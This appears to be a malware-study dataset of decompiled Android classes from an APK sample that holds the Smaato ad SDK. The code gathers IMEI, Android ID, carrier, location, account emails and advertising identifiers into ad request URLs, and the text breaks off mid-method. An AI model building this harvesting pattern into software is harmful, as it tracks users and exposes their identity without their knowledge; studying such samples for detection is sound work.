"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\AdDownloader.code","public class AdDownloader implements AdDownloaderInterface, ConnectionListenerInterface {   protected static final int REQUEST_TIME_OUT=5000;   protected static final int SUCCESS_RESPONSE=200;   private static final String TAG=""SOMA"";   private transient AdSettings a=new AdSettings();   private transient UserSettings b=new UserSettings();   private boolean c=false;   private final List<AdListenerInterface> d=new ArrayList();   private AdDownloader e;   private LocationCollector f;   private HttpConnectorInterface g; class AnonymousClass5 {   }   public AdDownloader(  Context context) throws AdDownloaderInstantiationException {     this.e=null;     this.g=null;     try {       this.f=new LocationCollector(this,context);       RequestsBuilder.a().a(context);       this.e=this;       this.g=DefaultFactory.a().b();       this.g.a(this);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AdDownloaderInstantiationException(e2);     }   }   protected final URL a(  AdSettings adSettings,  UserSettings userSettings) throws UnableToMakeAdRequestUrl {     try {       return RequestsBuilder.a().a(adSettings,userSettings,this);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToMakeAdRequestUrl(e2);     }   }   @Override public final void b(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         AdDownloader.this.b(AdDownloader.this.getAdSettings(),AdDownloader.this.getUserSettings());         return null;       }     } .c();   }   public final boolean b(  AdSettings adSettings,  UserSettings userSettings) throws RequestingBannerFailed {     try {       return this.g.b(a(adSettings,userSettings));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RequestingBannerFailed(e2);     }   }   @Override public final AdSettings getAdSettings(){     return this.a;   }   @Override public final void setAdSettings(  AdSettings adSettings){     this.a=adSettings;   }   @Override public final boolean b(  final AdListenerInterface adListenerInterface){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(AdDownloader.this.d.remove(adListenerInterface));       }     } .c().booleanValue();   }   @Override public final void a(  final AdListenerInterface adListenerInterface){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         AdDownloader.this.d.add(adListenerInterface);         return null;       }     } .c();   }   @Override public final UserSettings getUserSettings(){     return this.b;   }   @Override public void setUserSettings(  UserSettings userSettings){     this.b=userSettings;   }   public LocationCollector d(){     return this.f;   }   @Override public final void a(  ReceivedBannerInterface receivedBannerInterface) throws UnableToNotifyAdListener {     try {       Debugger.a(new Object(){       } );       if (receivedBannerInterface == null) {         Debugger.a(new LogMessage(""SOMA"",""No Banner Received !!"",1,DebugCategory.WARNING));         return;       }       if (receivedBannerInterface.i() == ErrorCode.NO_AD_AVAILABLE) {         Debugger.a(new LogMessage(""SOMA"",""No Ad Available"",1,DebugCategory.DEBUG));       }       Debugger.a(new LogMessage(""SOMA"",""Banner download complete"",1,DebugCategory.DEBUG));       Iterator<AdListenerInterface> it=this.d.iterator();       while (it.hasNext()) {         it.next().a(this.e,receivedBannerInterface);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToNotifyAdListener(e2);     }   }   @Override public final boolean c(){     return this.c;   } class AnonymousClass6 extends CrashReportTemplate<Void> {     final AdDownloader a;     private final double b;     private final double c;     @Override public Void b() throws Exception {       this.a.f.a(this.b,this.c);       return null;     }   }   @Override public final void setLocationUpdateEnabled(  final boolean z){     Debugger.a(new Object(){     } );     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         AdDownloader.this.f.a(z);         AdDownloader.this.c=z;         return null;       }     } .c();   }   @Override public void a(){     Debugger.a(new Object(){     } );     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         AdDownloader.this.g.a();         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\AnonymousClass5.code","class AnonymousClass5 { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\AnonymousClass6.code","class AnonymousClass6 extends CrashReportTemplate<Void> {   final AdDownloader a;   private final double b;   private final double c;   @Override public Void b() throws Exception {     this.a.f.a(this.b,this.c);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\BeaconRequest.code","public class BeaconRequest extends AsyncTask<String,Void,Void> {   @Override public final Void doInBackground(  final String... strArr){     return new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         for (        String str : strArr) {           BeaconRequest.this.a(str);         }         return null;       }     } .c();   }   protected final void a(  String str) throws LoadingBeaconFailed {     try {       Debugger.a(new Object(){       } );       HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();       httpURLConnection.setRequestMethod(""GET"");       httpURLConnection.setConnectTimeout(5000);       httpURLConnection.setRequestProperty(""User-Agent"",RequestsBuilder.a().b());       httpURLConnection.connect();       httpURLConnection.getInputStream();       httpURLConnection.disconnect();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new LoadingBeaconFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\DownloadTask.code","public class DownloadTask extends AsyncTask<URL,Void,ReceivedBannerInterface> {   private DownloadTask(){   }   DownloadTask(  HttpConnector httpConnector,  DownloadTask downloadTask){     this();   }   @Override public ReceivedBannerInterface doInBackground(  final URL... urlArr){     return new CrashReportTemplate<ReceivedBannerInterface>(){       @Override public ReceivedBannerInterface b() throws Exception {         return HttpConnector.this.a(urlArr[0]);       }     } .c();   }   @Override public void onPostExecute(  final ReceivedBannerInterface receivedBannerInterface){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(HttpConnector.a,""Load async finished!"",1,DebugCategory.DEBUG));         if (HttpConnector.this.c != null) {           HttpConnector.this.c.a(receivedBannerInterface);           return null;         }         return null;       }     } .c();     super.onPostExecute(receivedBannerInterface);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\HttpConnector.code","public class HttpConnector implements HttpConnectorInterface {   private static String a=""HTTPConnector"";   private XmlParserInterface b;   private ConnectionListenerInterface c=null;   private ReceivedBannerInterface d;   public HttpConnector() throws HttpConnectorInstantiationException {     this.b=null;     try {       this.b=DefaultFactory.a().c();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new HttpConnectorInstantiationException(e2);     }   }   public com.smaato.soma.ReceivedBannerInterface a(  java.net.URL r8) throws com.smaato.soma.exception.LoadingNewBannerFailedException {     throw new UnsupportedOperationException(""Method not decompiled: com.smaato.soma.internal.requests.HttpConnector.a(java.net.URL):com.smaato.soma.ReceivedBannerInterface"");   }   @Override public final boolean b(  URL url) throws BannerHttpRequestFailed {     try {       Debugger.a(new LogMessage(a,""Load async: "" + url,1,DebugCategory.DEBUG));       new DownloadTask(this,null).execute(url);       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerHttpRequestFailed(e2);     }   }   @Override public void a(  ConnectionListenerInterface connectionListenerInterface){     this.c=connectionListenerInterface;   }   @Override public void a() throws BeaconHttpConnectionFailed {     try {       ReceivedBannerInterface receivedBannerInterface=this.d;       if (receivedBannerInterface != null && receivedBannerInterface.a() == BannerStatus.SUCCESS && receivedBannerInterface.e() != null && !receivedBannerInterface.e().isEmpty()) {         new BeaconRequest().execute((String[])receivedBannerInterface.e().toArray(new String[0]));       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BeaconHttpConnectionFailed(e2);     }   } public class DownloadTask extends AsyncTask<URL,Void,ReceivedBannerInterface> {     private DownloadTask(){     }     DownloadTask(    HttpConnector httpConnector,    DownloadTask downloadTask){       this();     }     @Override public ReceivedBannerInterface doInBackground(    final URL... urlArr){       return new CrashReportTemplate<ReceivedBannerInterface>(){         @Override public ReceivedBannerInterface b() throws Exception {           return HttpConnector.this.a(urlArr[0]);         }       } .c();     }     @Override public void onPostExecute(    final ReceivedBannerInterface receivedBannerInterface){       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           Debugger.a(new LogMessage(HttpConnector.a,""Load async finished!"",1,DebugCategory.DEBUG));           if (HttpConnector.this.c != null) {             HttpConnector.this.c.a(receivedBannerInterface);             return null;           }           return null;         }       } .c();       super.onPostExecute(receivedBannerInterface);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\HttpConnectorInterface.code","public interface HttpConnectorInterface {   void a() throws BeaconHttpConnectionFailed ;   void a(  ConnectionListenerInterface connectionListenerInterface);   boolean b(  URL url) throws BannerHttpRequestFailed ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\InternalAdSettings.code","public class InternalAdSettings {   private AdSettings a;   public InternalAdSettings(  AdSettings adSettings){     this.a=adSettings;   }   public StringBuffer a() throws GeneratingAdSettingsRequestFailed {     try {       Debugger.a(new Object(){       } );       StringBuffer stringBuffer=new StringBuffer();       if (this.a.a() >= 0) {         stringBuffer.append(String.format(Locale.US,""pub=%d"",Integer.valueOf(this.a.a())));       }       if (this.a.b() >= 0) {         stringBuffer.append(String.format(Locale.US,""&adspace=%d"",Integer.valueOf(this.a.b())));       }       if (AdType.a(this.a.c()).length() > 0) {         stringBuffer.append(String.format(Locale.US,""&format=%s"",AdType.a(this.a.c())));       }       if (this.a.e() > 0) {         stringBuffer.append(String.format(Locale.US,""&width=%d"",Integer.valueOf(this.a.e())));       }       if (this.a.f() > 0) {         stringBuffer.append(String.format(Locale.US,""&height=%d"",Integer.valueOf(this.a.f())));       }       if (AdDimension.a(this.a.d()).length() > 0) {         stringBuffer.append(String.format(Locale.US,""&dimension=%s"",AdDimension.a(this.a.d())));         stringBuffer.append(""&dimensionstrict="" + this.a.g());       }       return stringBuffer;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GeneratingAdSettingsRequestFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests\RequestsBuilder.code","public class RequestsBuilder {   private static RequestsBuilder a=null;   private final String b=""HTTP_Connector"";   private String c;   protected RequestsBuilder(){   }   public static RequestsBuilder a(){     if (a == null) {       a=new RequestsBuilder();     }     return a;   }   public final void a(  Context context) throws RequestBuilderInitialisationFailed {     try {       DeviceDataCollector.a().a(context);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RequestBuilderInitialisationFailed(e2);     }   }   public URL a(  AdSettings adSettings,  UserSettings userSettings,  AdDownloader adDownloader) throws AdRequestConstructionFailed {     try {       Debugger.a(new Object(){       } );       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(""http://soma.smaato.net/oapi/reqAd.jsp?"");       StringBuffer a2=new InternalAdSettings(adSettings).a();       if (a2 != null && a2.length() > 0) {         stringBuffer.append(a2);       }       StringBuffer a3=new InternalUserSettings(userSettings).a();       if (a3 != null && a3.length() > 0) {         stringBuffer.append(a3);       }       stringBuffer.append(""&modifyRM=true"");       stringBuffer.append(""&beacon=true&response=XML"");       stringBuffer.append(""&formatstrict=true"");       stringBuffer.append(""&client="").append(StringFormatter.a(Values.SOMA_SDK_VERSION));       stringBuffer.append(DeviceDataCollector.a().a(adDownloader,userSettings.a(),userSettings.b()));       stringBuffer.append(""&apiver=413"");       Debugger.a(new LogMessage(""HTTP_Connector"",""request URL: "" + stringBuffer.toString(),1,DebugCategory.VERVOSE));       return new URL(stringBuffer.toString());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AdRequestConstructionFailed(e2);     }   }   public String b(){     return this.c;   }   public void a(  String str){     this.c=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\DeviceDataCollector.code","public class DeviceDataCollector {   private static final String FACEBOOK_ATTRIBUTION_ID_COLUMN_NAME=""aid"";   private static final String TAG=""Data_Collector"";   private static final Uri d=Uri.parse(""content://com.facebook.katana.provider.AttributionIdProvider"");   private static DeviceDataCollector e;   private String f;   private Context i;   protected String a="""";   protected String b="""";   protected String c="""";   private String g=null;   private String h=null;   private DeviceDataCollector(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         DeviceDataCollector.this.h();         DeviceDataCollector.this.n();         return null;       }     } .c();   }   public static DeviceDataCollector a(){     if (e == null) {       e=new DeviceDataCollector();     }     return e;   }   public final String b() throws RetrievingReleaseVersionFailed {     try {       return Build.VERSION.RELEASE;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingReleaseVersionFailed(e3);     }   }   public final String c() throws RetrievingDeviceModelFailed {     try {       return Build.MODEL;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingDeviceModelFailed(e3);     }   }   public final String d() throws RetrievingDeviceBrandFailed {     try {       return Build.BRAND;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingDeviceBrandFailed(e3);     }   }   public final String e() throws RetrievingImeiFailed {     String deviceId;     try {       Debugger.a(new Object(){       } );       if (this.i.checkCallingOrSelfPermission(""android.permission.READ_PHONE_STATE"") == -1) {         Debugger.a(new LogMessage(TAG,""Please enable permission READ_PHONE_STATE!"",1,DebugCategory.WARNING));       }  else {         TelephonyManager telephonyManager=(TelephonyManager)this.i.getSystemService(""phone"");         if (telephonyManager != null && (deviceId=telephonyManager.getDeviceId()) != null) {           return deviceId.toLowerCase(Locale.ENGLISH);         }       }       return null;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingImeiFailed(e3);     }   }   public final String f() throws RetrievingConnectionTypeFailed {     try {       Debugger.a(new Object(){       } );       if (this.f != null) {         return this.f;       }       if (this.i.checkCallingOrSelfPermission(""android.permission.ACCESS_NETWORK_STATE"") == -1) {         Debugger.a(new LogMessage(TAG,""You should add the permission ACCESS_NETWORK_STATE in the manifest file."",1,DebugCategory.VERVOSE));         return null;       }       if (this.i.checkCallingOrSelfPermission(""android.permission.READ_PHONE_STATE"") == -1) {         Debugger.a(new LogMessage(TAG,""You should add the permission READ_PHONE_STATE in the manifest file."",1,DebugCategory.VERVOSE));         return null;       }       NetworkInfo activeNetworkInfo=((ConnectivityManager)this.i.getSystemService(""connectivity"")).getActiveNetworkInfo();       TelephonyManager telephonyManager=(TelephonyManager)this.i.getSystemService(""phone"");       this.g=telephonyManager.getNetworkOperatorName();       this.h=telephonyManager.getNetworkOperator();       if (activeNetworkInfo != null) {         int type=activeNetworkInfo.getType();         if (type == 1) {           this.f=""wifi"";         }  else         if (type == 0) {           this.f=""carrier"";         }         return this.f;       }       return """";     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingConnectionTypeFailed(e3);     }   }   public final String g() throws RetrievingAndroidIdFailed {     try {       try {         Debugger.a(new Object(){         } );         try {           return Settings.Secure.getString(this.i.getContentResolver(),""android_id"");         }  catch (        Exception e2) {           try {             return Settings.System.getString(this.i.getContentResolver(),""android_id"");           }  catch (          Exception e3) {             return null;           }         }       }  catch (      RuntimeException e4) {         throw e4;       }     }  catch (    Exception e5) {       throw new RetrievingAndroidIdFailed(e5);     }   }   public final void h() throws FacebookAttributionFailedException {     try {       new FacebookAttributionIDProvider(this,null).start();     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new FacebookAttributionFailedException(e3);     }   }   public final void a(  Context context){     this.i=context;   }   public final String a(  AdDownloader adDownloader,  double d2,  double d3) throws GeneratingDeviceDataFailedException {     try {       try {         Debugger.a(new Object(){         } );         StringBuffer stringBuffer=new StringBuffer();         String e2=e();         if (e2 != null && e2.length() > 0) {           stringBuffer.append(""&ownid="");           stringBuffer.append(StringFormatter.a(e2));         }         String f=f();         if (f != null && f.length() > 0) {           stringBuffer.append(""&connection="");           stringBuffer.append(StringFormatter.a(f));         }         if (this.g != null && this.g.length() > 0) {           stringBuffer.append(""&carrier="");           stringBuffer.append(StringFormatter.a(this.g));         }         if (this.h != null && this.h.length() > 0) {           stringBuffer.append(""&carriercode="");           stringBuffer.append(StringFormatter.a(this.h));         }         String g=g();         if (g != null && g.length() > 0) {           stringBuffer.append(""&androidid="");           stringBuffer.append(StringFormatter.a(g));         }         if (this.a != null && this.a.length() > 0) {           stringBuffer.append(""&fattributionid="");           stringBuffer.append(StringFormatter.a(this.a));         }         try {           stringBuffer.append(adDownloader.d().b(d2,d3));           String b=b();           if (b != null && b.length() > 0) {             stringBuffer.append(""&osversion="");             stringBuffer.append(StringFormatter.a(b));           }           String c=c();           if (c != null && c.length() > 0) {             stringBuffer.append(""&devicemodel="");             stringBuffer.append(StringFormatter.a(c));           }           String d4=d();           if (d4 != null && d4.length() > 0) {             stringBuffer.append(""&devicebrand="");             stringBuffer.append(StringFormatter.a(d4));           }           int i=a().i();           if (i > 0) {             stringBuffer.append(""&screenwidth="" + i);           }           int j=a().j();           if (j > 0) {             stringBuffer.append(""&screenheight="" + j);           }           stringBuffer.append(""&devicetype="" + b(this.i));           String k=k();           if (k != null && k.length() > 0) {             stringBuffer.append(""&odin="");             stringBuffer.append(StringFormatter.a(k));           }           String m=a().m();           if (m != null && m.length() > 0) {             stringBuffer.append(""&lang="" + m);           }           stringBuffer.append(""&osname="" + o());           stringBuffer.append(""&portrait="" + l());           stringBuffer.append(""&mraidver=2"");           if (this.b != null && this.b.length() > 0) {             stringBuffer.append(""&googleadid="" + this.b);           }           if (this.c != null && this.c.length() > 0) {             stringBuffer.append(""&googlednt="" + this.c);           }           String p=p();           if (p != null && p.length() > 0) {             stringBuffer.append(""&userid="" + p);           }         }  catch (        Exception e3) {           Debugger.a(new LogMessage(TAG,""Cannot retreive device info"",1,DebugCategory.EXCEPTION,e3));         }         return stringBuffer.toString();       }  catch (      RuntimeException e4) {         throw e4;       }     }  catch (    Exception e5) {       throw new GeneratingDeviceDataFailedException(e5);     }   }   public int i() throws UnableToGetScreenWidth {     try {       Debugger.a(new Object(){       } );       WindowManager windowManager=(WindowManager)this.i.getSystemService(""window"");       try {         Display defaultDisplay=windowManager.getDefaultDisplay();         Point point=new Point();         defaultDisplay.getSize(point);         return point.x;       }  catch (      NoSuchMethodError e2) {         return windowManager.getDefaultDisplay().getWidth();       }     }  catch (    RuntimeException e3) {       throw e3;     } catch (    Exception e4) {       throw new UnableToGetScreenWidth(e4);     }   }   public int j() throws UnableToGetTheScreenHeight {     try {       Debugger.a(new Object(){       } );       WindowManager windowManager=(WindowManager)this.i.getSystemService(""window"");       try {         Display defaultDisplay=windowManager.getDefaultDisplay();         Point point=new Point();         defaultDisplay.getSize(point);         return point.y;       }  catch (      NoSuchMethodError e2) {         return windowManager.getDefaultDisplay().getHeight();       }     }  catch (    RuntimeException e3) {       throw e3;     } catch (    Exception e4) {       throw new UnableToGetTheScreenHeight(e4);     }   }   public String k() throws RetrievingODIN1Failed {     try {       Debugger.a(new Object(){       } );       return ODIN.a(this.i);     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingODIN1Failed(e3);     }   }   public boolean l() throws RetrievingDeviceOrientationFailed {     try {       this.i.getResources().getConfiguration();       return this.i.getResources().getConfiguration().orientation == 1;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new RetrievingDeviceOrientationFailed(e3);     }   }   public String m() throws GettingDisplayLanguageFailed {     try {       if (this.i == null) {         return """";       }       StringBuffer stringBuffer=new StringBuffer("""");       String language=this.i.getResources().getConfiguration().locale.getLanguage();       String country=this.i.getResources().getConfiguration().locale.getCountry();       if (language != null && language.length() > 0 && country != null && country.length() > 0) {         stringBuffer.append(language);         stringBuffer.append(""-"");         stringBuffer.append(country);       }       return stringBuffer.toString();     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new GettingDisplayLanguageFailed(e3);     }   }   public static int b(  Context context) throws UnableToGetDeviceType {     try {       return (context.getResources().getConfiguration().screenLayout & 15) >= 3 ? 1 : 0;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new UnableToGetDeviceType(e3);     }   }   public final void n() throws GoogleAdvertisingIdFailed {     try {       new GoogleAdvertisingIdProvider(this,null).start();     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new GoogleAdvertisingIdFailed(e3);     }   }   public String o() throws OsNameFailedException {     try {       if (Build.BRAND.toLowerCase(Locale.ENGLISH).contains(Values.BLACKBERRY_PLATFORM_NAME)) {         return Values.BLACKBERRY_PLATFORM_NAME;       }       if (Build.MODEL.toLowerCase(Locale.ENGLISH).contains(Values.KINDLE_PLATFORM_NAME)) {         return Values.KINDLE_PLATFORM_NAME;       }       return Values.ANDROID_PLATFORM_NAME;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new OsNameFailedException(e3);     }   }   public String p() throws EmailFailed {     try {       String str="""";       if (r()) {         Pattern pattern=Patterns.EMAIL_ADDRESS;         for (        Account account : AccountManager.get(this.i).getAccounts()) {           if (pattern.matcher(account.name).matches()) {             str=Converter.a().a(account.name);           }         }       }  else {         Debugger.a(new LogMessage(TAG,""Please include android.permission.GET_ACCOUNTS to your manifest!"",1,DebugCategory.WARNING));       }       return str;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new EmailFailed(e3);     }   }   private boolean r() throws CheckEmailPermissionFailed {     try {       return this.i.checkCallingOrSelfPermission(""android.permission.GET_ACCOUNTS"") == 0;     }  catch (    RuntimeException e2) {       throw e2;     } catch (    Exception e3) {       throw new CheckEmailPermissionFailed(e3);     }   } public class FacebookAttributionIDProvider extends Thread {     private FacebookAttributionIDProvider(){     }     FacebookAttributionIDProvider(    DeviceDataCollector deviceDataCollector,    FacebookAttributionIDProvider facebookAttributionIDProvider){       this();     }     @Override public void run(){       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           Cursor cursor;           Cursor cursor2=null;           Debugger.a(new Object(){           } );           try {             cursor=DeviceDataCollector.this.i.getContentResolver().query(DeviceDataCollector.d,new String[]{DeviceDataCollector.FACEBOOK_ATTRIBUTION_ID_COLUMN_NAME},null,null,null);           }  catch (          Exception e) {             cursor=null;           } catch (          Throwable th) {             th=th;           }           if (cursor != null) {             try {             }  catch (            Exception e2) {               if (cursor != null) {                 cursor.close();               }               return null;             } catch (            Throwable th2) {               cursor2=cursor;               th=th2;               if (cursor2 != null) {                 cursor2.close();               }               throw th;             }             if (cursor.moveToFirst()) {               DeviceDataCollector.this.a=cursor.getString(cursor.getColumnIndex(DeviceDataCollector.FACEBOOK_ATTRIBUTION_ID_COLUMN_NAME));               if (cursor != null) {                 cursor.close();               }               return null;             }           }           if (cursor != null) {             cursor.close();           }           return null;         }       } .c();     }   } public class GoogleAdvertisingIdProvider extends Thread {     private GoogleAdvertisingIdProvider(){     }     GoogleAdvertisingIdProvider(    DeviceDataCollector deviceDataCollector,    GoogleAdvertisingIdProvider googleAdvertisingIdProvider){       this();     }     @Override public void run(){       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           try {             AdvertisingIdClient.Info advertisingIdInfo=AdvertisingIdClient.getAdvertisingIdInfo(DeviceDataCollector.this.i);             DeviceDataCollector.this.b=advertisingIdInfo.getId();             DeviceDataCollector.this.c=advertisingIdInfo.isLimitAdTrackingEnabled() ? ""1"" : ""0"";             return null;           }  catch (          RuntimeException e) {             throw e;           } catch (          Exception e2) {             throw new GoogleAdvertisingIdFailed(e2);           }         }       } .c();       super.run();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\FacebookAttributionIDProvider.code","public class FacebookAttributionIDProvider extends Thread {   private FacebookAttributionIDProvider(){   }   FacebookAttributionIDProvider(  DeviceDataCollector deviceDataCollector,  FacebookAttributionIDProvider facebookAttributionIDProvider){     this();   }   @Override public void run(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Cursor cursor;         Cursor cursor2=null;         Debugger.a(new Object(){         } );         try {           cursor=DeviceDataCollector.this.i.getContentResolver().query(DeviceDataCollector.d,new String[]{DeviceDataCollector.FACEBOOK_ATTRIBUTION_ID_COLUMN_NAME},null,null,null);         }  catch (        Exception e) {           cursor=null;         } catch (        Throwable th) {           th=th;         }         if (cursor != null) {           try {           }  catch (          Exception e2) {             if (cursor != null) {               cursor.close();             }             return null;           } catch (          Throwable th2) {             cursor2=cursor;             th=th2;             if (cursor2 != null) {               cursor2.close();             }             throw th;           }           if (cursor.moveToFirst()) {             DeviceDataCollector.this.a=cursor.getString(cursor.getColumnIndex(DeviceDataCollector.FACEBOOK_ATTRIBUTION_ID_COLUMN_NAME));             if (cursor != null) {               cursor.close();             }             return null;           }         }         if (cursor != null) {           cursor.close();         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\GoogleAdvertisingIdProvider.code","public class GoogleAdvertisingIdProvider extends Thread {   private GoogleAdvertisingIdProvider(){   }   GoogleAdvertisingIdProvider(  DeviceDataCollector deviceDataCollector,  GoogleAdvertisingIdProvider googleAdvertisingIdProvider){     this();   }   @Override public void run(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         try {           AdvertisingIdClient.Info advertisingIdInfo=AdvertisingIdClient.getAdvertisingIdInfo(DeviceDataCollector.this.i);           DeviceDataCollector.this.b=advertisingIdInfo.getId();           DeviceDataCollector.this.c=advertisingIdInfo.isLimitAdTrackingEnabled() ? ""1"" : ""0"";           return null;         }  catch (        RuntimeException e) {           throw e;         } catch (        Exception e2) {           throw new GoogleAdvertisingIdFailed(e2);         }       }     } .c();     super.run();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\InternalUserSettings.code","public class InternalUserSettings {   private UserSettings a;   public InternalUserSettings(  UserSettings userSettings){     this.a=userSettings;   }   public final StringBuffer a() throws GenerateUserSettingsFailed {     try {       Debugger.a(new Object(){       } );       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(""&coppa="" + this.a.c());       if (UserSettings.Gender.a(this.a.a).length() > 0) {         stringBuffer.append(String.format(Locale.US,""&gender=%s"",StringFormatter.a(UserSettings.Gender.a(this.a.a))));       }       if (this.a.b > 0) {         stringBuffer.append(String.format(Locale.US,""&age=%d"",Integer.valueOf(this.a.b)));       }       if (this.a.c != null && this.a.c.length() > 0) {         stringBuffer.append(String.format(Locale.US,""&kws=%s"",StringFormatter.a(this.a.c)));       }       if (this.a.d != null && this.a.d.length() > 0) {         stringBuffer.append(String.format(Locale.US,""&qs=%s"",StringFormatter.a(this.a.d)));       }       if (this.a.e != null && this.a.e.length() > 0) {         stringBuffer.append(String.format(Locale.US,""&region=%s"",StringFormatter.a(this.a.e)));       }       if (this.a.f != null && this.a.f.length() > 0) {         stringBuffer.append(String.format(Locale.US,""&city=%s"",StringFormatter.a(this.a.f)));       }       return stringBuffer;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GenerateUserSettingsFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\LocationCollector.code","public class LocationCollector implements LocationListener {   protected static final int MAX_LATITUDE=90;   protected static final int MAX_LONGITUDE=180;   private static final int MIN_DISTANCE=0;   protected static final int MIN_LATITUDE=-90;   protected static final int MIN_LONGITUDE=-180;   private static final int MIN_TIME=60000;   private static final String TAG=""Location_Collector"";   private final AdDownloaderInterface d;   private final Context e;   private final Geocoder f;   protected double a=0.0d;   protected double b=0.0d;   protected double c=0.0d;   private transient boolean g=false;   public LocationCollector(  AdDownloaderInterface adDownloaderInterface,  Context context){     this.d=adDownloaderInterface;     this.e=context;     this.f=new Geocoder(context,new Locale(Values.LANGUAGE,Values.COUNTRY));   }   @Override public void onLocationChanged(  final Location location){     Debugger.a(new Object(){     } );     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         double latitude=location.getLatitude();         double longitude=location.getLongitude();         LocationCollector.this.a=latitude;         LocationCollector.this.b=longitude;         LocationCollector.this.c=location.getAltitude();         return null;       }     } .c();   }   @Override public void onProviderDisabled(  String str){     Debugger.a(new Object(){     } );     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         LocationCollector.this.a=0.0d;         LocationCollector.this.b=0.0d;         return null;       }     } .c();   }   @Override public void onProviderEnabled(  String str){   }   @Override public void onStatusChanged(  String str,  int i,  Bundle bundle){   }   public final void a(  boolean z) throws ModifyingLocationStateFailed {     try {       Debugger.a(new Object(){       } );       this.g=z;       LocationManager a=a(b());       if (z) {         String a2=a(a);         Debugger.a(new LogMessage(TAG,""Best location provider: "" + a2,1,DebugCategory.INFO));         a.requestLocationUpdates(a2,60000L,0.0f,this);         return;       }       a.removeUpdates(this);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ModifyingLocationStateFailed(e2);     }   }   private String a(  LocationManager locationManager) 